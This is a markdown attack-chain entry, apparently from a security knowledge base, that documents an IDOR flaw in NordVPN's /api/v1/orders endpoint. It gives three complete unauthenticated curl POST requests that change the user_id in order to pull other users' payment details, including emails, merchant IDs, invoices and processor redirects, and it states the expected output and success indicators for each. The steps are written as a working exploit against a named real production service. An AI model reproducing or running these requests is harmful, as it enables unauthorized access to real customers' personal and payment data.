---
tags:
  - idor
  - api
  - payment-leak
  - nordvpn
  - unauthenticated-access
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-IDOR-via-Unauthenticated-POST-to-Orders-API]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:52.923Z'
description: >-
  A multi-step exploitation of an Insecure Direct Object Reference (IDOR)
  vulnerability in the NordVPN join site's API, allowing unauthenticated access
  to other users' sensitive payment confirmation details including emails,
  merchant IDs, invoices, and payment processor redirects.
skill_level: intermediate
impact_level: high
id: f8f42934-2063-4dff-8f49-c5161f3f4389
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# IDOR in NordVPN Orders API Leading to Unauthorized Payment Data Access

Multi-stage attack chain demonstrating the exploitation of an IDOR vulnerability in the /api/v1/orders endpoint of Nord Security's NordVPN join site. By manipulating the user_id parameter in unauthenticated POST requests, attackers can retrieve sensitive payment confirmation details for arbitrary users, including emails, payment URLs, merchant IDs, invoice numbers, and redirect parameters to external processors like CoinPayments and GoCardless.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Test with Known User ID] --> B[Modify User ID for Arbitrary Access]
    B --> C[Validate with Test Account to Confirm Leakage]
    C --> D[Data Exfiltration Complete]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- Web platform
- REST API endpoint: https://join.nordvpn.com/api/v1/orders
- Services: CoinPayments, GoCardless
- Tech stack: JSON over HTTP POST

### Initial Access Requirements

- No credentials required (unauthenticated endpoint)
- Direct network access to the public-facing API
- No prior access needed

## Detailed Attack Procedures

### Step 1: Initial Test with Known User ID

procedure: [[procedures/Exploit-IDOR-via-Unauthenticated-POST-to-Orders-API]]

**Objective**: Send an unauthenticated POST request to the /api/v1/orders endpoint using a specific user_id to retrieve payment confirmation details and verify the lack of authentication checks.

**Instructions**: Use [[commands/nordvpn-idor-post-user20027039]] to initiate the request with user_id 20027039:

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Content-Type: application/json" \
  -d '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":20027039,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
```

**Expected Output**: JSON response containing order ID, user ID, and confirmation details with a redirect to coinpayments.net, including masked email, merchant ID, currency USD, amount 125.64, invoice 49476958, and callback URLs.

**Success Indicators**:
- Response includes sensitive payment details without authentication prompt
- Confirmation type: redirect_post to external payment processor

### Step 2: Modify User ID for Arbitrary Access

procedure: [[procedures/Exploit-IDOR-via-Unauthenticated-POST-to-Orders-API]]

**Objective**: Alter the user_id parameter to access payment details of a different user, demonstrating the IDOR by retrieving unrelated account data.

**Instructions**: Execute [[commands/nordvpn-idor-post-user23093782]] with modified user_id 23093782:

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Content-Type: application/json" \
  -d '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":23093782,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
```

**Expected Output**: JSON response with a different order ID, user ID 89495166, and redirect to pay.gocardless.com flow URL.

**Success Indicators**:
- Response shows data for user_id 89495166 instead of the requested 23093782
- Confirmation type: redirect to GoCardless payment flow

### Step 3: Validate with Test Account to Confirm Leakage

procedure: [[procedures/Exploit-IDOR-via-Unauthenticated-POST-to-Orders-API]]

**Objective**: Use a test account user_id to confirm the vulnerability exposes even controlled sensitive information, such as test emails and payment parameters.

**Instructions**: Run [[commands/nordvpn-idor-post-user89495247]] targeting user_id 89495247:

```bash
curl -X POST https://join.nordvpn.com/api/v1/orders \
  -H "Accept: application/json" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Content-Type: application/json" \
  -d '{"payment":{"provider_method_account":"6xdxdd","parameters":{}},"action":"order","plan_id":653,"user_id":89495247,"tax_country_code":"TW","payment_retry":0,"is_installment":false}'
```

**Expected Output**: JSON response with order ID, user ID 89495247, and redirect_post to coinpayments.net including test email 'hackerhacker@test.pl', merchant ID, USD 125.64, invoice 49478089, and URLs.

**Success Indicators**:
- Exposure of test email and full payment parameters
- Confirmation of arbitrary access without validation

## Attack Chain Summary

### Key Achievements

1. Successful unauthenticated access to multiple users' payment orders
2. Leakage of sensitive data including emails, invoices, and payment redirects
3. Confirmation of IDOR impact on production API without server-side checks

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery

### MITRE ATT&CK Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
